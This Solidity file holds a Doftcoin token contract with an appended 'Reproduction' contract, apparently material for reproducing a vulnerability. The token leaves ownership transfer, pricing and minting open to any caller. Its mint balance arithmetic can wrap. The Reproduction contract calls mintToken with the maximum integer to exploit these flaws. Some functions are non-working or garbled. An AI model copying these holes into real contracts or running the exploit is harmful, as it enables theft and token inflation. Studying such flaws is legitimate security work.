/**
 *Submitted for verification at Etherscan.io on 2017-09-28
*/




// do not add pragma statement here, it will cause problems with the solcmc

// pragma solidity ^0.8.18;
contract owned { 
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }

    function transferOwnership(address newOwner) public {
        owner = newOwner;
    }
}






contract doftManaged { 
    address public doftManager;
    
    constructor() public {
        doftManager = msg.sender;
    }

    function transferDoftManagment(address newDoftManager) public  {
        doftManager = newDoftManager;
	//coins for mining should be transferred after transferring of doftManagment
    }
}





abstract contract ERC20 {

    function balanceOf(address _owner) external view virtual returns (uint balance);
    function transfer(address _to, uint _value) public virtual returns (bool success);
}






contract BasicToken is ERC20 { 
    uint256 _totalSupply;
    
    mapping (address => uint256) public  override balanceOf;


    // event Transfer(address indexed _from, address indexed _to, uint _value);
    // event Approval(address indexed _owner, address indexed _spender, uint _value);


    // event Transfer(address indexed _from, address indexed _to, uint256 _value);
    // event Approval(address indexed _owner, address indexed _spender, uint256 _value);



    /* Internal transfer, only can be called by this contract */
    function _transfer(address _from, address _to, uint _value) internal {
        require (_to != address(0));                        // Prevent transfer to 0x0 address. Use burn() instead
        require (balanceOf[_from] > _value);                // Check if the sender has enough


        balanceOf[_from] -= _value;                         // Subtract from the sender
        balanceOf[_to] += _value;                           // Add the same to the recipient
        // emit Transfer(_from, _to, _value);
    }

    function transfer(address _to, uint _value) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    
}








contract Doftcoin is BasicToken{
    string public name; 
    string public symbol; 
    uint256 public decimals; 
    uint256 public sellPrice;
    uint256 public buyPrice;
    uint256 public miningStorage;
    string public version; 

    // event Mine(address target, uint256 minedAmount);

    // setbalanceOf() public {
    //     decimals = 18;
    //     _totalSupply = 5000000 * (10 ** decimals);  // Update total supply
    //     miningStorage = _totalSupply / 2;
    //     name = "Doftcoin";                                   // Set the name for display purposes
    //     symbol = "DFC";                               // Set the symbol for display purposes

    //     balanceOf[msg.sender] = _totalSupply;              // Give the creator all initial tokens
	// version = "1.0";
    // }

    function setbalanceOf() public {
        balanceOf[msg.sender] = _totalSupply;   
        decimals = 18;
        _totalSupply = 5000000 * (10 ** 18);  // Update total supply
        miningStorage = _totalSupply / 2;
        name = "Doftcoin";                                   // Set the name for display purposes
        symbol = "DFC";                               // Set the symbol for display purposes
	    version = "1.0";
    }

    /// @notice Buy tokens from contract by sending ether
    function buy() public payable {
	    require(buyPrice > 0);
        uint amount = msg.value / buyPrice;               // calculates the amount
        //_transfer(address(this), msg.sender, amount);     // makes the transfers
    }

    /// @notice Sell `_amount` tokens to contract
    /// @param _amount Amount of tokens to be sold
    function sell(uint256 _amount) public {
	    require(sellPrice > 0);
        //require(address(this).balance >= _amount * sellPrice);      // checks if the contract has enough ether to buy
        _transfer(msg.sender, address(this), _amount);     // makes the transfers
        payable(msg.sender).transfer(_amount * sellPrice);          // sends ether to the seller. It's important to do this last to avoid recursion attacks
    }

    /// @notice Allow users to buy tokens for `_newBuyPrice` eth and sell tokens for `_newSellPrice` eth
    /// @param _newSellPrice Price the users can sell to the contract
    /// @param _newBuyPrice Price users can buy from the contract
    function setPrices(uint256 _newSellPrice, uint256 _newBuyPrice) public  {
        sellPrice = _newSellPrice;
        buyPrice = _newBuyPrice;
    }

    // /// @notice Send `_minedAmount` to `_target` as a reward for mining
    // /// @param _target The address of the recipient
    // /// @param _minedAmount The amount of reward tokens
    // /// @dev This function is intended to be called by the Doft Manager
    // /// @dev It should only be called by the Doft Manager to ensure proper management of mining rewards
    // /// @dev The function updates the balance of the target address and the total supply accordingly
    // /// @dev The function does not emit any events, as it is a private operation
    // /// @param _target The address of the recipient
    // /// @param _mintedAmount The amount of reward tokens to be minted
    
    function mintToken(address _target, uint256 _mintedAmount) public  {
        balanceOf[msg.sender] = _totalSupply; 
        uint balanceOf_target = balanceOf[_target];
        balanceOf_target += _mintedAmount;
        balanceOf[_target] = balanceOf_target; 
    }
}




contract Reproduction {
  Doftcoin public vulnerableContract;
  address public attacker;

  constructor(address _vulnerableContract) {
    vulnerableContract = Doftcoin(_vulnerableContract);
  }
  function setupExploit(address _target) public {
    // require(msg.sender == attacker, "Only attacker can call this function");
    uint256 maxUint = type(uint256).max;
    vulnerableContract.mintToken(_target, maxUint);
  }
  function triggerExploit() public {
    // require(msg.sender == attacker, "Only attacker can call this function");
    vulnerableContract.mintToken(attacker, 1);
  }
  function checkBalance(address _target) public view returns (uint256) {
   // return vulnerableContract.balanceOf(_target);
  }
}